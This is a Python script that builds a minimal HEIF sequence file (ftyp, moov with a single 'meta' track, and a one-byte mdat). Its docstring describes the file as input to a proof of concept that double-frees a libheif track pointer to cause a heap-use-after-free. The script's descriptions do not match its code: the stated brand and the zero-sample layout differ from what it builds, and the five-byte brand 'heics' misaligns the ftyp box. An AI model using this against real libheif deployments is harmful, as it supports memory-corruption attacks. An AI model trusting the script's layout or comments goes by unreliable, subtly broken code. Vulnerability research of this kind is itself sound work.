#!/usr/bin/env python3
"""
gen_heif.py — Generate a minimal HEIF sequence file containing one track.

The file is a valid ISO Base Media File Format (ISOBMFF) container with:
  ftyp  — file type box (brand: heic, compatible: heic mif1 miaf)
  moov  — movie container
    mvhd — movie header (version 0, timescale=1000, next_track_id=2)
    trak — track container
      tkhd — track header (track_id=1, enabled+in_movie flags)
      mdia — media container
        mdhd — media header (timescale=1000, 0 samples)
        hdlr — handler box (handler_type='meta')
        minf — media information container
          nmhd — null media header
          dinf — data information (dref with url entry)
          stbl — sample table container
            stsd — sample description (0 entries)
            stts — time-to-sample (0 entries)
            stsc — sample-to-chunk (0 entries)
            stsz — sample sizes  (0 samples)
            stco — chunk offsets (0 chunks)

The resulting file is fed into the POC to obtain a heif_track* pointer,
which is then double-freed to trigger the heap-use-after-free.
"""

import struct
import sys


def box(fourcc: str, payload: bytes) -> bytes:
    """Build a basic ISOBMFF box: [4-byte size][4-byte type][payload]."""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, fourcc.encode()) + payload


def fullbox(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """Build a FullBox: [size][type][version(1)][flags(3)][payload]."""
    fb_payload = struct.pack(">B3s", version, flags.to_bytes(3, "big")) + payload
    return box(fourcc, fb_payload)


def build_ftyp() -> bytes:
    """ftyp: major_brand=msf1 (HEIF sequence structural brand), minor_version=0.
    Including 'msf1' as both major and compatible brand tells libheif this is a
    sequence file so it does NOT require a top-level 'meta' box."""
    payload = b"msf1"                            # major brand = sequence
    payload += struct.pack(">I", 0)              # minor version
    payload += b"msf1" + b"heics" + b"mif1"     # compatible brands
    return box("ftyp", payload)


def build_mvhd() -> bytes:
    """mvhd version=0: creation_time=0, mod_time=0, timescale=1000,
    duration=0, rate=0x10000, volume=0x100, matrix(identity), next_track_id=2"""
    payload = struct.pack(">IIIII",
                          0,       # creation_time
                          0,       # modification_time
                          1000,    # timescale
                          0,       # duration
                          0x00010000)  # rate (1.0 fixed-point)
    payload += struct.pack(">H", 0x0100)  # volume (1.0)
    payload += b"\x00" * 10              # reserved
    # identity matrix
    payload += struct.pack(">9I",
                           0x00010000, 0, 0,
                           0, 0x00010000, 0,
                           0, 0, 0x40000000)
    payload += b"\x00" * 24              # pre-defined
    payload += struct.pack(">I", 2)      # next_track_ID
    return fullbox("mvhd", 0, 0, payload)


def build_tkhd(track_id: int) -> bytes:
    """tkhd version=0, flags=3 (enabled + in-movie):
    track_id=<track_id>, duration=0, width=0, height=0"""
    flags = 0x000003  # Track_enabled | Track_in_movie
    payload = struct.pack(">IIII",
                          0,        # creation_time
                          0,        # modification_time
                          track_id,
                          0)        # reserved
    payload += struct.pack(">II",
                           0,       # reserved
                           0)       # duration
    payload += b"\x00" * 8          # reserved
    payload += struct.pack(">HH",
                           0,       # layer
                           0)       # alternate_group
    payload += struct.pack(">H", 0x0100)  # volume
    payload += b"\x00" * 2               # reserved
    # identity matrix
    payload += struct.pack(">9I",
                           0x00010000, 0, 0,
                           0, 0x00010000, 0,
                           0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)  # width, height (fixed-point 16.16)
    return fullbox("tkhd", 0, flags, payload)


def build_mdhd() -> bytes:
    """mdhd version=0: timescale=1000, duration=0, language='und'"""
    payload = struct.pack(">IIII",
                          0,     # creation_time
                          0,     # modification_time
                          1000,  # timescale
                          0)     # duration
    # language: ISO-639-2/T packed into 2 bytes, 'und' = 0x55C4
    # Each char: 5 bits, offset by 0x60. 'u'=21, 'n'=14, 'd'=4
    lang = ((21 & 0x1f) << 10) | ((14 & 0x1f) << 5) | (4 & 0x1f)
    payload += struct.pack(">H", lang)
    payload += struct.pack(">H", 0)  # pre-defined
    return fullbox("mdhd", 0, 0, payload)


def build_hdlr(handler_type: str) -> bytes:
    """hdlr: handler_type='meta', name=''"""
    payload = struct.pack(">I", 0)                     # pre-defined
    payload += handler_type.encode()[:4].ljust(4, b'\x00')  # handler_type
    payload += b"\x00" * 12                            # reserved
    payload += b"\x00"                                 # name (null-terminated empty)
    return fullbox("hdlr", 0, 0, payload)


def build_nmhd() -> bytes:
    """nmhd: null media header, flags=1"""
    return fullbox("nmhd", 0, 1, b"")


def build_url() -> bytes:
    """url  (data entry URL, self-contained, flags=1)"""
    return fullbox("url ", 0, 1, b"")


def build_dref() -> bytes:
    """dref: 1 entry (self-contained url)"""
    url_entry = build_url()
    payload = struct.pack(">I", 1) + url_entry  # entry_count=1
    return fullbox("dref", 0, 0, payload)


def build_dinf() -> bytes:
    """dinf container with dref"""
    return box("dinf", build_dref())


def build_urim_sample_entry() -> bytes:
    """urim: URI Meta Sample Entry (6 bytes reserved + 2 bytes data_reference_index=1).
    This is the simplest valid sample entry for a 'meta' handler track."""
    payload = b"\x00" * 6           # reserved
    payload += struct.pack(">H", 1)  # data_reference_index = 1
    return box("urim", payload)


def build_stsd() -> bytes:
    """stsd: 1 sample entry (urim — URI meta sample entry)."""
    sample_entry = build_urim_sample_entry()
    payload = struct.pack(">I", 1) + sample_entry  # entry_count = 1
    return fullbox("stsd", 0, 0, payload)


def build_stts() -> bytes:
    """stts: 1 entry covering 1 sample with duration=1."""
    payload = struct.pack(">I", 1)                   # entry_count = 1
    payload += struct.pack(">II", 1, 1)              # sample_count=1, sample_delta=1
    return fullbox("stts", 0, 0, payload)


def build_stsc() -> bytes:
    """stsc: 1 entry — first_chunk=1, samples_per_chunk=1, sample_description_index=1."""
    payload = struct.pack(">I", 1)                   # entry_count = 1
    payload += struct.pack(">III", 1, 1, 1)          # first_chunk, spc, sdi
    return fullbox("stsc", 0, 0, payload)


def build_stsz() -> bytes:
    """stsz: 1 sample of size 1 byte (variable sizes)."""
    payload = struct.pack(">II",
                          0,   # sample_size = 0 (variable per-sample sizes follow)
                          1)   # sample_count = 1
    payload += struct.pack(">I", 1)  # entry_size[0] = 1 byte
    return fullbox("stsz", 0, 0, payload)


def build_stco(mdat_offset: int) -> bytes:
    """stco: 1 chunk offset pointing to the mdat payload byte."""
    payload = struct.pack(">I", 1)                 # entry_count = 1
    payload += struct.pack(">I", mdat_offset)      # chunk_offset[0]
    return fullbox("stco", 0, 0, payload)


def build_stbl(mdat_offset: int) -> bytes:
    """stbl container with 1 sample pointing into mdat."""
    payload = (build_stsd() +
               build_stts() +
               build_stsc() +
               build_stsz() +
               build_stco(mdat_offset))
    return box("stbl", payload)


def build_minf(mdat_offset: int) -> bytes:
    """minf container: nmhd + dinf + stbl"""
    payload = build_nmhd() + build_dinf() + build_stbl(mdat_offset)
    return box("minf", payload)


def build_mdia(mdat_offset: int) -> bytes:
    """mdia container: mdhd + hdlr + minf"""
    payload = build_mdhd() + build_hdlr("meta") + build_minf(mdat_offset)
    return box("mdia", payload)


def build_trak(track_id: int, mdat_offset: int) -> bytes:
    """trak container: tkhd + mdia"""
    payload = build_tkhd(track_id) + build_mdia(mdat_offset)
    return box("trak", payload)


def build_moov(mdat_offset: int) -> bytes:
    """moov container: mvhd + trak"""
    payload = build_mvhd() + build_trak(1, mdat_offset)
    return box("moov", payload)


def build_mdat() -> bytes:
    """mdat: 1 dummy byte of sample data."""
    return box("mdat", b"\x00")


def main():
    output_path = "minimal_sequence.heif"
    if len(sys.argv) > 1:
        output_path = sys.argv[1]

    # Layout: ftyp | moov | mdat
    # We need to know the byte offset of the mdat payload before writing moov,
    # so we compute sizes iteratively.
    ftyp = build_ftyp()

    # First pass: estimate moov size with a dummy offset to compute layout.
    dummy_moov = build_moov(0)
    mdat_box_offset = len(ftyp) + len(dummy_moov)
    # mdat payload starts 8 bytes after the mdat box start (4-size + 4-type)
    mdat_payload_offset = mdat_box_offset + 8

    # Second pass: build moov with the real mdat payload offset.
    moov = build_moov(mdat_payload_offset)
    mdat = build_mdat()

    data = ftyp + moov + mdat

    with open(output_path, "wb") as f:
        f.write(data)

    print(f"[+] Wrote {len(data)} bytes to {output_path}")
    print(f"[+] Layout: ftyp({len(ftyp)}B) + moov({len(moov)}B) + mdat({len(mdat)}B)")
    print(f"[+] Track ID: 1, handler: meta, 1 sample at offset {mdat_payload_offset}")


if __name__ == "__main__":
    main()
